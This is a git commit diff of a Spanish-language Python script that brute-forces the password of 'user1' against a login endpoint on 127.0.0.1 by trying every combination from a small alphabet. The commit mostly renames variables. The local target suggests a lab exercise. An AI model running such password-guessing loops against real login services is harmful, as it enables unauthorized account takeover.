b84a4d00dae0ecbd5a2592b09d0d68f89a167879
Piwody <mateosteve1312@gmail.com>
2026-04-09 13:44:46 -0500

    cambios

--- autonomo.py
+++ autonomo.py
@@ -2,15 +2,16 @@ import time
 import requests
 from itertools import product 
 
-URL_LOGIN = "http://127.0.0.1:8000/login"
-USUARIO_OBJETIVO = "user1"
+URL= "http://127.0.0.1:8000/login"
+pana = "user1"
 
-def intentar_login(password_probar):
-    datos = {"username": USUARIO_OBJETIVO, "contrasena": password_probar}
+def intentar(p):
+    datos = {"username": pana, "contrasena": p}
     try:
-        r = requests.post(URL_LOGIN, json=datos)
+        r = requests.post(URL, json=datos)
         return r.status_code == 200
     except:
+        print("Error de conexoon: ")
         return False
 
 def bruteforce_itertools(alfabeto):
@@ -23,13 +24,14 @@ def bruteforce_itertools(alfabeto):
             intentos += 1
             palabra = "".join(combinacion)
             
-            if intentar_login(palabra):
-                fin = time.time()
+            if intentar(palabra):
+                Tiempo = time.time()
                 print(f"\n ¡CONTRASEÑA ENCONTRADA!: {palabra}")
-                print(f" Intentos: {intentos} | Tiempo: {fin - inicio:.2f}segundos")
+                print(f" Intentos: {intentos} | Tiempo: {Tiempo - inicio:.2f}segundos")
                 return palabra
     return None
 
-if __name__ == "__main__":
-    alfabeto = "abcdefghijklmnopqrstuvwxyz0123456789"
+if __name__== "__main__":
+    alfabeto = "abc123"
+    print("Iniciando....")
     bruteforce_itertools(alfabeto)
